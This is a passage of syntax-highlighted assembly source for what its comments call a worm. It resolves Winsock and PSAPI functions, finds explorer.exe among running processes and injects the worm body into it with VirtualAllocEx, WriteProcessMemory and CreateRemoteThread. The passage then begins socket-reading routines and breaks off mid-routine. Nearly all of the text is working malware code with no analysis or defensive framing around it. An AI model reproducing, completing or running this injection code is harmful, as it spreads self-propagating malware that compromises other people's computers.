    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_bind</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'listen'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_listen</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'accept'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_accept</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'gethostname'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_gethostname</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'gethostbyname'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_gethostbyname</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'closesocket'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'WSACleanup'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_WSACleanup</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">wsock32_api</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">



</span><span class="sc1">;retrieves all needed API addresses from PSAPI.dll</span><span class="sc0">

</span><span class="sc5">psapi_apiz</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'PSAPI'</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_LoadLibraryA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;load PSAPI.dll</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_psapi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'EnumProcesses'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_GetProcAddress</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_EnumProcesses</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;save API address</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'EnumProcessModules'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_EnumProcessModules</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;--- " " ---</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'GetModuleBaseNameA'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetModuleBaseNameA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;--- " " ---</span><span class="sc0">
</span><span class="sc5">psapi_apiz</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">






</span><span class="sc1">;analyses running process, searches for explorer.exe and implants there worm body</span><span class="sc0">

</span><span class="sc5">analyse_process</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">43Ah</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_OpenProcess</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;PID -&gt; handle</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_ap</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hProcess</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;save handle to stack *</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">modz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_EnumProcessModules</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get first (main) module</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_ap1</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">module_base</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mod_name</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_GetModuleBaseNameA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get its name</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_ap1</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'explorer.exe'</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lowercase</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_ap1</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">_virtual_end</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
</span><span class="sc5">virtual_end</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RESERVE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">hProcess</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_VirtualAllocEx</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;reserve 64MB of memory for worm</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; ( more memory may be allocated</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_ap1</span><span class="sc0">             </span><span class="sc1">;at runtime )</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hProcess</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;aloc memory for worm</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_ap1</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">worm_base</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc1">;save address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hProcess</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_WriteProcessMemory</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;write there our code</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">free_mem</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ps_patch</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">
                        </span><span class="sc1">;patch short jump with 2 NOPs</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Start</span><span class="sc4">-</span><span class="sc5">rtStart</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hProcess</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CreateRemoteThread</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;run remote thread!</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_ap1</span><span class="sc0">



</span><span class="sc1">;make string lowercase proc</span><span class="sc0">

</span><span class="sc5">lowercase</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">c_lc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">e_lc</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c_lc</span><span class="sc0">
</span><span class="sc5">e_lc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;free allocated memory</span><span class="sc0">

</span><span class="sc5">free_mem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hProcess</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_VirtualFreeEx</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;deallocate memory</span><span class="sc0">



</span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">end_ap1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;close process handle *</span><span class="sc0">
</span><span class="sc5">end_ap</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">analyse_process</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">






</span><span class="sc1">;read 5 bytez from the socket</span><span class="sc0">

</span><span class="sc5">get_response5</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">;ECX = 5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@response</span><span class="sc0">
</span><span class="sc5">response</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@response</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;EDI = 5-bytes long buffer</span><span class="sc0">



</span><span class="sc1">;read ECX bytez to EDI PTR buffer</span><span class="sc0">

</span><span class="sc5">get_response</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">hSocket</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
